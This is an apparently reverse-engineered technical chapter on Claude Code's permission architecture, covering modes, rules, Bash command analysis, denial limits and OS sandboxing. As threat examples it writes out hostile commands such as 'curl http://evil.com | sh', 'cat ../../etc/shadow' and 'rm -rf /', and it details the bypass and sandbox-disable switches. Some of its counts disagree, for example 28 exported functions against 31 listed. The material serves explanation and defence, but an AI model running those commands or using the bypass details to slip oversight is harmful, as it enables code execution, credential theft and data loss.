<p align="right"><a href="../cn/05_module_permission.md">中文</a></p>

# Phase 5: Deep Dive into the Permission System

> The permission system is Claude Code's security core. This chapter examines the full multi-layer permission architecture spanning **111 source files**, from interface contracts to implementation details, from Bash command safety analysis to OS-level sandbox isolation. The analysis is cross-validated through source-map reconstruction and runtime inspection of `cli.js`.


## Contents

1. Interface Contracts
   - 1.1 PermissionMode - Permission Mode Enumeration
   - 1.2 PermissionRule - Permission Rule Definition
   - 1.3 PermissionResult - Permission Decision Result
   - 1.4 PermissionContext - Permission Context
   - 1.5 ToolPermissionContext - Tool Permission Context
   - 1.6 Entry Points for Permission Checks
2. Implementation Mechanisms
   - 2.1 Three-layer Permission Architecture
   - 2.2 Six-layer Configuration Priority System
   - 2.3 Permission Decision Flow
   - 2.4 Bash Command Safety Analysis
   - 2.5 Auto Mode Classifier
   - 2.6 Denial Tracking
   - 2.7 Permission UI Component System
   - 2.8 Sandbox Integration
   - 2.9 Swarm Permission Synchronization
3. Evolution Thought Experiment
4. Verification


## 1. Interface Contracts

The interface contract of the permission system is spread across six core type definitions and three handler entry points.

### 1.1 PermissionMode - Permission Mode Enumeration

**Source file**: `src/utils/permissions/PermissionMode.ts`

Permission mode defines the global safety strategy for tool execution. The following enum values can be extracted from `cli.js`:

```typescript
// Base modes (5)
const basePermissionModes = [
  "acceptEdits",
  "bypassPermissions",
  "default",
  "dontAsk",
  "plan"
];

// Full set (6, including auto)
const permissionModes = [...basePermissionModes, "auto"];
```

| Mode | Behavior | Typical Use Case |
|------|------|----------|
| `default` | Ask for confirmation on every non-read-only operation | First-time use, high-safety environments |
| `acceptEdits` | Auto-allow file edits, ask about other actions | Day-to-day development where file edits are trusted |
| `plan` | Planning mode: generate a plan rather than executing immediately | Reviewing complex work, team approval flows |
| `bypassPermissions` | Skip all permission prompts, gated by `allowDangerouslySkipPermissions: true` | CI/CD and trusted automation |
| `dontAsk` | Never prompt; silently deny anything not already pre-authorized | Headless agents and background automation |
| `auto` | Let an AI classifier decide whether execution looks safe | Higher throughput with a balance of safety and ergonomics |

**Key design decision**: `dontAsk` does **not** mean "allow everything." It means "deny everything that is not already pre-authorized." It is one of the most conservative modes, not one of the most permissive.

### 1.2 PermissionRule - Permission Rule Definition

**Source files**: `src/utils/permissions/PermissionRule.ts`, `src/utils/permissions/permissionRuleParser.ts`

Permission rules use a declarative syntax and support multiple granularities:

```json
{
  "permissions": {
    "allow": ["Bash(npm:*)", "Edit(.claude)", "Read"],
    "deny": ["Bash(rm -rf:*)"],
    "ask": ["Write(/etc/*)"],
    "defaultMode": "default",
    "additionalDirectories": ["/extra/dir"]
  }
}
```

**Rule-matching syntax**:

| Pattern Type | Example | Meaning |
|------|------|------|
| Exact match | `"Bash(npm run test)"` | Matches only `npm run test` |
| Prefix wildcard | `"Bash(git:*)"` | Matches `git status`, `git commit`, and similar commands |
| Tool-level | `"Read"` | Applies to every Read operation |
| Domain-specific | `"WebFetch(domain:example.com)"` | Restricts WebFetch to a given domain |

**Rule source tags**:

Each rule carries a `source` field that identifies where it came from and therefore how it should be prioritized:

```
"policySettings"  -> Enterprise MDM policy, highest priority and non-overridable
"flagSettings"    -> Remote feature-flag distribution
"userSettings"    -> User-level configuration in ~/.claude/settings.json
"projectSettings" -> Project-level configuration in .claude/settings.json
"localSettings"   -> Local per-machine configuration in .claude/settings.local.json
"command"         -> One-off CLI arguments
```

### 1.3 PermissionResult - Permission Decision Result

**Source file**: `src/utils/permissions/PermissionResult.ts`

Permission decisions are returned as structured results carrying both the action and the reasoning chain:

```typescript
interface PermissionResult {
  behavior: "allow" | "deny" | "ask" | "passthrough";
  message?: string;
  updatedInput?: unknown;
  suggestions?: PermissionSuggestion[];
  decisionReason?: PermissionDecisionReason;
}
```

**Decision reason types** (`PermissionDecisionReason`):

| Type | Meaning |
|------|------|
| `type: "rule"` | A predefined allow / deny / ask rule matched |
| `type: "mode"` | The decision came from the active permission mode |
| `type: "classifier"` | The automatic classifier made the decision |
| `type: "hook"` | A PermissionRequest Hook made the decision |
| `type: "asyncAgent"` | The action happened in a headless or async-agent context |
| `type: "safetyCheck"` | A safety check such as dangerous-pattern detection triggered |
| `type: "other"` | Any other cause, such as classifier context overflow |

### 1.4 PermissionContext - Permission Context

**Source file**: `src/hooks/toolPermission/PermissionContext.ts`

This React Context bridges the permission system into the Ink UI:

```
PermissionContext
├── Current permission mode
├── Authorized rule list
├── Denied rule list
├── Permission callback set
└── UI rendering state
```

**Lifecycle**: It is created at application startup and updated dynamically in response to user interaction and configuration changes.

### 1.5 ToolPermissionContext - Tool Permission Context

**Source**: Runtime structure extracted from `cli.js`

```typescript
interface ToolPermissionContext {
  mode: PermissionMode;
  additionalWorkingDirectories: Map<string, unknown>;
  alwaysAllowRules: Record<string, unknown>;
  alwaysDenyRules: Record<string, unknown>;
  alwaysAskRules: Record<string, unknown>;
  isBypassPermissionsModeAvailable: boolean;
  shouldAvoidPermissionPrompts?: boolean;
}
```

This is the main runtime payload that drives every permission decision. Before each tool call, Claude Code retrieves it from `AppState.toolPermissionContext`.

### 1.6 Entry Points for Permission Checks

**Three handlers**, each serving a distinct execution context:

| Handler | Source File | Responsibility |
|--------|--------|------|
| `interactiveHandler.ts` | `src/hooks/toolPermission/handlers/` | Permission handling for interactive CLI sessions |
| `coordinatorHandler.ts` | same directory | Permission handling for multi-agent coordinator scenarios |
| `swarmWorkerHandler.ts` | same directory | Permission proxying for Swarm worker processes |

**Core call chain**:

```
initializeToolPermissionContext()   // Build permission context at startup
        ↓
getToolPermissionContext()          // Read current permission context
        ↓
aPK(tool, input, context)           // Main permission entry point
  ├── dm8() -> evaluate deny rules
  ├── EZK() -> evaluate allow rules
  ├── tool.checkPermissions()
  └── mode dispatch -> classifier / UI / silent path
```


## 2. Implementation Mechanisms

### 2.1 Three-layer Permission Architecture

Claude Code implements a defense-in-depth design with three distinct permission layers:

```
┌─────────────────────────────────────────────────────────────────────┐
│  Layer 1: Global Configuration                                      │
│  ┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐  │
│  │ toolPermission   │  │ managed-settings │  │ 6-layer config   │  │
│  │ Mode (6 modes)   │  │ .json (MDM)      │  │ override system   │  │
│  └──────────────────┘  └──────────────────┘  └──────────────────┘  │
├─────────────────────────────────────────────────────────────────────┤
│  Layer 2: Tool Layer                                                 │
│  ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌──────────────────┐    │
│  │ Bash      │ │ FileEdit  │ │ FileWrite │ │ WebFetch         │    │
│  │ command   │ │ path      │ │ path      │ │ domain           │    │
│  │ classifier│ │ validation│ │ validation│ │ validation       │    │
│  │ danger    │ │ diff      │ │ content   │ │ network          │    │
│  │ detection │ │ preview   │ │ review    │ │ isolation        │    │
│  └───────────┘ └───────────┘ └───────────┘ └──────────────────┘    │
├─────────────────────────────────────────────────────────────────────┤
│  Layer 3: Command Layer (Bash / PowerShell only)                     │
│  ┌───────────┐ ┌───────────────┐ ┌──────────────┐ ┌────────────┐   │
│  │ bashClass │ │ dangerous     │ │ yoloClass    │ │ shellRule  │   │
│  │ ifier.ts  │ │ Patterns.ts   │ │ ifier.ts     │ │ Matching   │   │
│  └───────────┘ └───────────────┘ └──────────────┘ └────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

**Layer 1: global configuration** decides the overall behavior strategy. Enterprise administrators can use `managed-settings.json` to force sandboxing, disable dangerous modes, or lock permission sources. Individual users can customize behavior through `settings.json` or CLI flags.

**Layer 2: tool-level checks** let each tool implement its own `checkPermissions()` logic:

- **Bash** calls the Bash classifier for semantic safety analysis
- **FileEdit / FileWrite** validate target paths and generate diffs or previews
- **WebFetch** validates domains
- **MCP tools** often return `passthrough`, delegating to higher-level policy

**Layer 3: command-level analysis** is applied only to Bash and PowerShell, adding deep semantic inspection of the actual command content.

### 2.2 Six-layer Configuration Priority System

Permission rules are assembled from six configuration sources with strict priority ordering:

```
Priority (high -> low):
┌──────────────────────────────────────────────────────────────┐
│ 1. policySettings                                            │
│    Path: /Library/Application Support/ClaudeCode/            │
│          managed-settings.json + managed-settings.d/*.json   │
│    Non-overridable, supports drop-in extension directories   │
├──────────────────────────────────────────────────────────────┤
│ 2. flagSettings                                              │
│    Remote feature-flag distribution                          │
│    Used for A/B testing and gradual rollout                  │
├──────────────────────────────────────────────────────────────┤
│ 3. userSettings                                              │
│    Path: ~/.claude/settings.json                             │
│    Cross-project user defaults                               │
├──────────────────────────────────────────────────────────────┤
│ 4. projectSettings                                           │
│    Path: .claude/settings.json                               │
│    Team-shared project-level policy                          │
├──────────────────────────────────────────────────────────────┤
│ 5. localSettings                                             │
│    Path: .claude/settings.local.json                         │
│    Gitignored local override                                 │
├──────────────────────────────────────────────────────────────┤
│ 6. command                                                   │
│    Source: CLI flags like --permission-mode, --allowedTools  │
│    One-off and non-persistent                                │
└──────────────────────────────────────────────────────────────┘
```

**Enterprise controls** exposed through `policySettings`:

| Setting Key | Effect |
|--------|------|
| `allowManagedPermissionRulesOnly` | Use only enterprise-managed rules |
| `allowManagedHooksOnly` | Run only enterprise-managed hooks |
| `allowManagedDomainsOnly` | Allow only enterprise-approved network domains |
| `allowManagedMcpServersOnly` | Restrict MCP servers to the enterprise allowlist |
| `allowManagedReadPathsOnly` | Restrict sandbox-readable paths to enterprise config |
| `disableBypassPermissionsMode` | Disable `bypassPermissions` entirely |
| `disableAutoMode` | Disable `auto` mode entirely |

**MDM paths by platform**:

| Platform | Base Configuration Path | Drop-in Directory |
|------|-------------|-------------|
| macOS | `/Library/Application Support/ClaudeCode/managed-settings.json` | `managed-settings.d/*.json` |
| macOS (MDM) | `/Library/Managed Preferences/com.anthropic.claudecode.plist` | — |
| Linux | `/etc/claude-code/managed-settings.json` | `managed-settings.d/*.json` |
| Windows | `HKLM\SOFTWARE\Policies\ClaudeCode` registry | — |

### 2.3 Permission Decision Flow

Every tool invocation goes through the following decision process, reverse-engineered from the runtime function `aPK()` inside `cli.js`:

```
Tool invocation request
    │
    ▼
[1] Evaluate deny rules (dm8)
    │── match -> immediate deny ─────────────────────────→ { behavior: "deny" }
    │
    ▼
[2] Evaluate allow rules (EZK)
    │── match -> skip interactive checks ───────────────→ { behavior: "allow" }
    │
    ▼
[3] Call tool.checkPermissions()
    │── returns behavior, suggestions, and tool-specific analysis
    │
    ▼
[4] Dispatch by permission mode
    ├── bypassPermissions -> allow
    │
    ├── plan (when isBypassPermissionsModeAvailable)
    │   └──→ allow via plan-mode bypass path
    │
    ├── dontAsk -> silent deny ─────────────────────────→ { behavior: "deny" }
    │
    ├── auto / plan(auto) -> [5] automatic classifier
    │   ├── classifier approves -> { behavior: "allow" }
    │   ├── classifier denies -> check denial limits
    │   │   ├── headless -> throw AbortError
    │   │   └── CLI -> fall back to interactive prompt
    │   └── classifier unavailable -> fail-open / fail-closed path
    │
    ├── acceptEdits -> auto-allow edit-like tools
    │   └── everything else -> [6] interactive prompt
    │
    └── default -> [6] interactive prompt
                               │
                               ▼
                    User chooses: allow / deny / remember
                               │
                               ├── remember allow -> add allow rule
                               ├── remember deny  -> add deny rule
                               └── one-off choice -> current invocation only
                               │
                               ▼
                    Record decision -> update denialTracking -> return result
```

**PermissionRequest Hook interception**:

In headless-agent scenarios, Claude Code checks the `PermissionRequest` Hook before interactive prompting:

```json
{
  "hooks": {
    "PermissionRequest": [{
      "matcher": "Bash|Edit",
      "hooks": [{
        "type": "command",
        "command": "/path/to/permission-checker.sh"
      }]
    }]
  }
}
```

Such hooks can return decisions like `{ "decision": "allow" }` or `{ "decision": "deny", "message": "..." }` and replace the interactive UI.

### 2.4 Bash Command Safety Analysis

Bash has the most sophisticated safety pipeline in the permission system. Four specialized source files work together to classify and constrain command execution.

**Source files**:

| File | Responsibility |
|------|------|
| `src/utils/permissions/bashClassifier.ts` | Main Bash classification logic |
| `src/utils/permissions/dangerousPatterns.ts` | Dangerous-pattern rule library |
| `src/utils/permissions/yoloClassifier.ts` | Classification used by auto-accept modes |
| `src/utils/permissions/shellRuleMatching.ts` | Shell-rule matching engine |

**Five-step analysis flow**:

```
Bash command string
    │
    ▼
[Step 1] Parse the command
    │ Parse pipes (|), redirects (>, >>), and variable substitution ($...)
    │ Recognize subcommands and chains (&&, ||, ;)
    │ Extract command names and arguments
    │
    ▼
[Step 2] Match dangerous patterns
    │ Level 1 - remote code execution
    │ Level 2 - data destruction
    │ Level 3 - system-level changes
    │ Level 4 - information leakage
    │── any match -> mark as safetyCheck -> require explicit review
    │
    ▼
[Step 3] Read-only validation
    │ Determine whether the command is effectively read-only
    │
    ▼
[Step 4] Path validation
    │ Check whether accessed paths stay within allowed working directories
    │
    ▼
[Step 5] Semantic analysis
    │ Consider side effects, command composition, and execution mode
```

**Classifier context example**:

```json
{
  "classifierContext": {
    "allow": ["npm run test", "git status"],
    "soft_deny": ["rm -rf", "sudo"],
    "environment": ["CI=true"]
  }
}
```

- `allow`: tells the classifier these commands are typically safe in the current project
- `soft_deny`: warns the classifier that these commands should usually not be auto-approved
- `environment`: gives additional context such as CI mode

**Dangerous permission detection**:

Before entering `auto` mode, Claude Code scans for permission rules that are too broad or unsafe:

```typescript
isOverlyBroadBashAllowRule()
isOverlyBroadPowerShellAllowRule()
isDangerousBashPermission()
isDangerousPowerShellPermission()
isDangerousTaskPermission()
findDangerousClassifierPermissions()
stripDangerousPermissionsForAutoMode()
restoreDangerousPermissions()
```

This ensures that even if a user configured an overly broad allow rule, auto mode still treats those actions carefully.

### 2.5 Auto Mode Classifier

**Source files**:

- `src/utils/permissions/yoloClassifier.ts`
- `src/utils/permissions/classifierDecision.ts`
- `src/utils/permissions/classifierShared.ts`
- `src/utils/permissions/autoModeState.ts`
- `src/utils/permissions/getNextPermissionMode.ts`

Auto mode is designed to reduce unnecessary prompts without giving up all safety checks. The classifier takes the current command, surrounding context, active rules, and environmental signals, and decides whether the tool use is likely safe enough to auto-approve.

Its design goals are:

- minimize unnecessary user interruptions
- preserve safety boundaries for destructive or ambiguous commands
- degrade gracefully when the classifier cannot decide confidently
- integrate with existing rules instead of replacing them

The classifier therefore sits *after* explicit allow / deny rules but *before* interactive prompting.

### 2.6 Denial Tracking

**Source files**: `src/utils/permissions/denialTracking.ts`, `src/utils/autoModeDenials.ts`

The denial-tracking subsystem monitors how often permission requests are rejected and applies protective limits when the model appears stuck.

**Data structure**:

```typescript
interface DenialTracking {
  consecutiveDenials: number;
  totalDenials: number;
}

function yp8(): DenialTracking {
  return { consecutiveDenials: 0, totalDenials: 0 };
}

const DENIAL_LIMITS = {
  maxConsecutive: 3,
  maxTotal: 20
};
```

**Trigger flow**:

```
Deny event -> increment counters
      ↓
Check whether limits are exceeded
      ├── consecutive denials >= 3
      │   ├── headless mode -> throw AbortError and stop the agent
      │   └── CLI mode -> fall back to interactive prompting and warn the user
      │
      └── total denials >= 20
          ├── headless mode -> throw AbortError
          └── CLI mode -> reset counters and show a summary warning
```

**Design intent**:

This prevents the model from entering infinite retry loops under restricted permissions. In headless environments, denial tracking acts as a circuit breaker for runaway automation.

**Telemetry event**: `tengu_auto_mode_denial_limit_exceeded`

```typescript
{
  limit: "total" | "consecutive",
  mode: "headless" | "cli",
  messageID: string,
  consecutiveDenials: number,
  totalDenials: number,
  toolName: string
}
```

### 2.7 Permission UI Component System

The permission system includes **59 UI component files**, forming the full user-facing approval interface.

**Component hierarchy**:

```
src/components/permissions/
├── PermissionPrompt.tsx
├── PermissionRequest.tsx
├── PermissionDialog.tsx
├── PermissionRequestTitle.tsx
├── PermissionExplanation.tsx
├── PermissionRuleExplanation.tsx
├── PermissionDecisionDebugInfo.tsx
│
├── BashPermissionRequest/
├── FileEditPermissionRequest/
├── FileWritePermissionRequest/
├── FilePermissionDialog/
├── NotebookEditPermissionRequest/
├── SedEditPermissionRequest/
├── PowerShellPermissionRequest/
├── WebFetchPermissionRequest/
├── ComputerUseApproval/
├── AskUserQuestionPermissionRequest/
├── SkillPermissionRequest/
├── SandboxPermissionRequest.tsx
├── FilesystemPermissionRequest.tsx
├── FallbackPermissionRequest.tsx
├── WorkerBadge.tsx
├── WorkerPendingPermission.tsx
│
├── hooks.ts
├── shellPermissionHelpers.tsx
├── useShellPermissionFeedback.ts
├── utils.ts
│
└── rules/
    ├── AddPermissionRules.tsx
    ├── AddWorkspaceDirectory.tsx
    ├── RemoveWorkspaceDirectory.tsx
    ├── PermissionRuleDescription.tsx
    ├── PermissionRuleInput.tsx
    ├── PermissionRuleList.tsx
    ├── RecentDenialsTab.tsx
    └── WorkspaceTab.tsx
```

**Top-level UI components**:

| Component | Source File | Purpose |
|------|--------|------|
| `BypassPermissionsModeDialog` | `src/components/BypassPermissionsModeDialog.tsx` | Confirmation dialog for entering bypass mode |
| `SandboxViolationExpandedView` | `src/components/SandboxViolationExpandedView.tsx` | Expanded detail view for sandbox violations |

### 2.8 Sandbox Integration

The sandbox is the final defensive layer. Even if permission checks allow an operation, OS-level sandboxing still limits what the process can actually do.

**Source files**:

| File | Responsibility |
|------|------|
| `src/tools/BashTool/shouldUseSandbox.ts` | Decide whether sandboxing should be enabled |
| `src/utils/sandbox/sandbox-adapter.ts` | Cross-platform sandbox adapter |
| `src/utils/sandbox/sandbox-ui-utils.ts` | Sandbox-related UI helpers |
| `@anthropic-ai/sandbox-runtime` | Sandbox runtime implementation |

**Representative runtime modules** in `@anthropic-ai/sandbox-runtime`:

```
sandbox-runtime/
├── sandbox-manager.js
├── sandbox-config.js
├── sandbox-utils.js
├── sandbox-violation-store.js
├── macos-sandbox-utils.js
├── linux-sandbox-utils.js
├── generate-seccomp-filter.js
├── http-proxy.js
├── socks-proxy.js
└── utils/
    ├── platform.js
    ├── ripgrep.js
    └── which.js
```

**Platform differences**:

| Capability | macOS | Linux |
|------|-------|-------|
| Sandbox technology | `sandbox-exec` via Seatbelt | Bubblewrap (`bwrap`) plus seccomp |
| Configuration format | `.sb` profile | Command-line arguments |
| Network isolation | Profile rules | seccomp plus proxying |
| Filesystem restrictions | Profile allow / deny rules | Bind mounts |
| Unix socket control | Path-based profile rules | seccomp cannot filter by path in the same way |

**macOS `sandbox-exec` integration**:

```javascript
let command = shellQuote(["env", ...envVars,
  "sandbox-exec", "-p", profileString,
  shellPath, "-c", userCommand
]);
```

**Sandbox-violation monitoring**:

```javascript
const logStream = spawn("log", [
  "stream",
  "--predicate", `(eventMessage ENDSWITH "${sentinel}")`,
  "--style", "compact"
]);
```

**Sandbox configuration structure**:

```typescript
SandboxConfig = {
  enabled: boolean,
  failIfUnavailable?: boolean,
  autoAllowBashIfSandboxed?: boolean,
  allowUnsandboxedCommands?: boolean,
  network?: {
    allowedDomains: string[],
    deniedDomains: string[],
    allowUnixSockets: string[],
    allowAllUnixSockets: boolean,
    allowLocalBinding: boolean,
    httpProxyPort: number,
    socksProxyPort: number
  },
  filesystem?: {
    allowWrite: string[],
    denyWrite: string[],
    denyRead: string[],
    allowRead: string[]
  },
  ignoreViolations?: Record<string, string[]>,
  enableWeakerNestedSandbox?: boolean,
  enableWeakerNetworkIsolation?: boolean,
  excludedCommands?: string[],
  ripgrep?: { command: string, args?: string[] }
}
```

**`autoAllowBashIfSandboxed`**:

When sandboxing is enabled, and this flag is true by default, Bash commands can skip permission prompts because the sandbox already constrains the process strongly enough to reduce risk.

**`allowUnsandboxedCommands`**:

This controls whether `dangerouslyDisableSandbox` can take effect. If set to `false`, all commands must run in a sandbox and no unsandboxed path remains.

### 2.9 Swarm Permission Synchronization

In Swarm mode, permissions must stay synchronized between the leader and worker agents.

**Source files**:

| File | Responsibility |
|------|------|
| `src/utils/swarm/leaderPermissionBridge.ts` | Leader-side permission bridge |
| `src/utils/swarm/permissionSync.ts` | Worker-to-leader permission synchronization |
| `src/hooks/toolPermission/handlers/swarmWorkerHandler.ts` | Worker permission handler |
| `src/bridge/bridgePermissionCallbacks.ts` | Bridge permission callbacks |

**Sync model**:

```
Worker 1  ──┐
Worker 2  ──┤──→ Leader (permission decision center) ──→ User
Worker 3  ──┘
```

Worker processes do not make independent permission decisions. They forward approval requests to the leader via `leaderPermissionBridge`, and the leader's permission system or UI returns the final decision.


## 3. Evolution Thought Experiment

### Level 1: Naive Global Switch

```typescript
if (globalPermission === "allow") {
  executeAll();
} else {
  denyAll();
}
```

**Problems**:

- Cannot distinguish `ls` from `rm -rf /`
- Forces users to choose between total trust and near-total unusability
- Not suitable for any serious production setting

### Level 2: Simple Allowlist / Denylist

```typescript
whitelist = ["ls", "cat", "git"]
blacklist = ["rm", "sudo"]

if (command in blacklist) deny();
else if (command in whitelist) allow();
else askUser();
```

**Problems**:

- Fails on `curl http://evil.com | sh`
- Vulnerable to path traversal such as `cat ../../etc/shadow`
- Too many prompts for unknown commands
- Cannot reason about pipelines, redirects, or subshells
- Rules explode in size and become hard to maintain across teams

### Level 3: Multi-layer Permissions + Intelligent Classification

Claude Code's current design addresses all of the above:

| Dimension | Problem in Level 1 / 2 | Level 3 Solution |
|------|-----------------|-------------------|
| Command injection | `curl \| sh` slips through | Pipeline analysis plus dangerous-pattern detection |
| Path traversal | `../../etc/shadow` succeeds | Path validation, workspace boundaries, sandboxing |
| User experience | Constant interruption | Six modes plus AI classifier |
| Team collaboration | Rules cannot be shared well | Six-layer config priority plus project / enterprise policy |
| Automation | Hard to run unattended | `dontAsk` + `auto` + PermissionRequest Hook |
| Process isolation | Only application-layer protection | OS-level sandboxing |
| Runaway retries | Infinite loops possible | Denial tracking plus circuit-breaker behavior |
| Enterprise control | No enforceable global policy | Non-overridable MDM-backed policy settings |
| Audit trail | No reliable record | Telemetry events, decision-reason chains, violation storage |

**Key shift from Level 2 to Level 3**:

1. **From command-name matching to semantic analysis**: `bashClassifier` reasons over the full command chain, flags, pipelines, and redirects.
2. **From binary decisions to context-aware decisions**: the classifier considers conversation context, project shape, and historical behavior.
3. **From application-only protection to OS-level isolation**: even if higher-level checks fail, the sandbox still constrains the process.
4. **From repeated asking to learning and memory**: remembered user choices are persisted as rules and reduce future interruption.


## 4. Verification

### 4.1 Source-file Coverage

| Category | File Count | Key Examples |
|------|--------|----------|
| UI components | 59 | `PermissionPrompt.tsx`, `BashPermissionRequest.tsx`, and related views |
| Utilities | 32 | `permissions.ts`, `bashClassifier.ts`, `denialTracking.ts`, and others |
| Hooks / handlers | 8 | `PermissionContext.ts`, `interactiveHandler.ts`, and related handlers |
| Sandbox-related | 12 | `shouldUseSandbox.ts`, `sandbox-adapter.ts`, plus runtime modules |
| **Total** | **111** | — |

### 4.2 `cli.js` Validation Checklist

The following datapoints were verified directly from the runtime bundle:

| Validation Item | Verification Method | Result |
|--------|----------|------|
| Permission-mode enum | Search runtime definition | 6 modes: `acceptEdits`, `bypassPermissions`, `default`, `dontAsk`, `plan`, `auto` |
| Config-source list | Search runtime config-source definition | 5 named sources in the runtime export path: `userSettings`, `projectSettings`, `localSettings`, `flagSettings`, `policySettings` |
| Denial-limit constants | Search runtime constant definition | `maxConsecutive: 3`, `maxTotal: 20` |
| Permission-rule syntax | Search runtime docs / parser behavior | Exact match, prefix wildcard, and tool-level syntax |
| `sandbox-exec` integration | Search for `sandbox-exec` | macOS uses the `-p` profile argument |
| Bubblewrap integration | Search for `bubblewrap` / `bwrap` | Linux sandbox path requires Bubblewrap |
| Enterprise control keys | Search `allowManaged*Only` | 5 enterprise-only lock switches |
| ToolPermissionContext | Search `getToolPermissionContext` | Includes mode, allow / deny / ask rules, and bypass-availability state |
| MDM paths | Search `managed-settings` | macOS uses `/Library/Application Support/ClaudeCode/`; Linux uses `/etc/claude-code/` |
| Permission exports | Search module exports | 28 exported functions across initialization, mode transitions, dangerous-rule detection, and rule management |

### 4.3 Exported Permission Functions

Full list of exported permission-related functions recovered from the bundle:

```
initializeToolPermissionContext
initialPermissionModeFromCLI
transitionPermissionMode
transitionPlanAutoMode
prepareContextForPlanMode
isDefaultPermissionModeAuto
isBypassPermissionsModeDisabled
shouldDisableBypassPermissions
checkAndDisableBypassPermissions
createDisabledBypassPermissionsContext
isAutoModeGateEnabled
getAutoModeEnabledState
getAutoModeEnabledStateIfCached
getAutoModeUnavailableReason
getAutoModeUnavailableNotification
hasAutoModeOptInAnySource
verifyAutoModeGateAccess
shouldPlanUseAutoMode
isOverlyBroadBashAllowRule
isOverlyBroadPowerShellAllowRule
isDangerousBashPermission
isDangerousPowerShellPermission
isDangerousTaskPermission
findDangerousClassifierPermissions
findOverlyBroadBashPermissions
findOverlyBroadPowerShellPermissions
stripDangerousPermissionsForAutoMode
removeDangerousPermissions
restoreDangerousPermissions
parseToolListFromCLI
parseBaseToolsFromCLI
```

### 4.4 Security Threat Mapping

| Threat | Protection Layer | Detection Mechanism |
|------|--------|----------|
| Remote code execution (`curl \| sh`) | Bash classifier + sandbox network isolation | dangerousPatterns Level 1 |
| Data destruction (`rm -rf /`) | Bash classifier + deny rules + sandbox filesystem controls | dangerousPatterns Level 2 |
| Privilege escalation (`sudo`) | Bash classifier + process isolation | dangerousPatterns Level 3 |
| Information leakage (`cat /etc/shadow`) | Path validation + sandbox read restrictions | dangerousPatterns Level 4 |
| Path traversal (`../../`) | `pathValidation` + `additionalDirectories` checks | normalized-path comparison |
| Command injection via pipes / redirects | Command-chain parsing + recursive subcommand inspection | Bash classifier pipeline analysis |
| Tool abuse / infinite retry loops | Denial tracking + circuit breaker | `maxConsecutive=3`, `maxTotal=20` |
| Policy bypass | Non-overridable `policySettings` + `disableBypassPermissionsMode` | MDM-enforced enterprise controls |
| Sandbox escape | `allowUnsandboxedCommands=false` | OS-level process isolation |
| Swarm worker drift | Leader permission bridge + permission synchronization | Workers have no independent approval authority |


> **Summary**: Claude Code's permission system is not a simple yes/no gate. It is a layered defense system spanning 111 source files. From six user-facing permission modes to a five-step Bash safety pipeline, from AI-assisted auto-mode decisions to OS-level sandbox isolation, each layer addresses a different threat model. Enterprises get non-bypassable policy control through MDM, developers gradually reduce interruptions through remembered rules, and automation workflows use `dontAsk` plus hooks to run safely without constant supervision.
